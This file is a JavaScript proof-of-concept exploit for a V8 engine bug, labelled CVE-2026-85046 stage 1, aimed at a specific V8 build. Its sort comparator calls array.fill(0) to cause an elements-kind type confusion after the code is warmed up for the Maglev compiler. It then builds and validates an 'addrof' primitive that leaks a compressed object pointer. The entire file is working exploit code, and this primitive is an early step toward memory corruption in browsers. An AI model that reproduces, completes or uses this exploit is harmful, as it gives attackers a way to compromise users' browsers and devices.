'use strict';

// CVE-2026-85046, stage 1: leak a V8 pointer-compression cage offset.
// Target: V8 15.2.124.18 (6aacaf6256a069ee455142333b7d38cad1c8d6e0).

function confuse(array) {
  function compare() {
    // A full replacement can migrate PACKED_ELEMENTS backwards to
    // PACKED_SMI_ELEMENTS while the inlined sort still owns a snapshot of
    // the original object elements.
    array.fill(0);
    return 0;
  }
  array.sort(compare);
}

// Collect polymorphic feedback and make the sort call site hot enough for
// Maglev. Both kinds use a FixedArray backing store.
for (let i = 0; i < 1000; ++i) {
  confuse([1, 2]);
  confuse([{}, {}]);
}

function addrof(object) {
  const confused = [object, object];
  confuse(confused);

  // Array stringification follows the now-incorrect Smi elements kind and
  // decodes the compressed tagged pointer as a Smi. Recover its raw 32-bit
  // tagged representation by undoing the one-bit Smi shift.
  const leakedSmi = Number(String(confused).split(',')[0]);
  return (leakedSmi * 2 + 1) >>> 0;
}

const marker = {marker: 0x85046};
const first = addrof(marker);
const second = addrof(marker);

print(`leak #1: 0x${first.toString(16).padStart(8, '0')}`);
print(`leak #2: 0x${second.toString(16).padStart(8, '0')}`);

if (first === 1 || first !== second || (first & 1) !== 1) {
  throw new Error('addrof validation failed');
}

// print('CVE-2026-85046 addrof primitive verified');
